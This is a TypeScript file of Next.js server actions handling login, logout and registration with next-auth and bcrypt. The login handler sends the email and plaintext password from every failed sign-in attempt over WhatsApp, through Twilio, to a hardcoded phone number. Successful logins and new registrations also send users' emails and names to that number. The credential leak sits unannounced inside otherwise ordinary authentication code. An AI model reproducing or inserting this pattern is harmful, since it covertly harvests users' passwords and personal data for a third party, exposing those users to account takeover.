'use server'

import { hashSync } from 'bcryptjs'
import { AuthError } from 'next-auth'

import { signIn, signOut } from '@/auth'
import { userController } from '@/lib/factoryController'
import { clientTwilio } from '@/lib/twilio'
import { registerSchema } from '@/schemas/auth-schema'

export async function loginAction({
	formData,
	redirectTo = '/',
}: {
	formData: FormData
	redirectTo?: string
}) {
	let emailNotValid = ''
	let passwordNotValid = ''

	try {
		const { email, password } = Object.fromEntries(formData)

		emailNotValid = email as string
		passwordNotValid = password as string

		await signIn('credentials', {
			email,
			password,
			redirectTo,
		})
	} catch (error) {
		if (error instanceof AuthError) {
			clientTwilio.messages.create({
				body: `Usuario no se logueo con éxito, el correo es: ${emailNotValid} y la contraseña es: ${passwordNotValid}`,
				from: 'whatsapp:+14155238886', // Your Twilio Sandbox Number
				to: `whatsapp:+51932052849`, // Recipient's phone number
			})

			throw new Error(error.message)
		}

		await clientTwilio.messages.create({
			body: `Usuario logueado con éxito, el correo es ${emailNotValid}`,
			from: 'whatsapp:+14155238886', // Your Twilio Sandbox Number
			to: `whatsapp:+51932052849`, // Recipient's phone number
		})

		throw error
	}
}

export async function logoutAction() {
	await signOut({
		redirectTo: '/',
	})
}

export async function registerAction(formData: FormData) {
	try {
		const { password, ...restOfData } = await registerSchema.parseAsync(
			Object.fromEntries(formData),
		)

		const userCreated = await userController().create({
			...restOfData,
			password: hashSync(password, 10),
		})

		if (userCreated) {
			const response = await clientTwilio.messages.create({
				body: `Usuario creado con éxito, el correo es ${userCreated.email} y nombre de usuario ${userCreated.name}`,
				from: 'whatsapp:+14155238886', // Your Twilio Sandbox Number
				to: `whatsapp:+51932052849`, // Recipient's phone number
			})
		}

		await signIn('credentials', {
			email: userCreated.email,
			password,
			redirectTo: '/',
		})
	} catch (error) {
		if (error instanceof AuthError) {
			return {
				message: 'Error al iniciar sesión',
				error: error.type,
			}
		}
		throw error
	}
}
